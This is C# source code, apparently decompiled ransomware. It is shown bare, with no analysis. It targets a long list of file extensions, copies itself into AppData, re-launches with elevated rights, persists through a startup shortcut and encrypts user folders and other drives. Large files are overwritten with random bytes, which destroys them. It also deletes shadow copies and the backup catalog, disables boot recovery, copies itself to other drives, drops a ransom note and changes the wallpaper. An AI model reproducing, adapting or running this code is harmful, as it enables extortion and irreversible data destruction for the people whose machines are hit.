		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
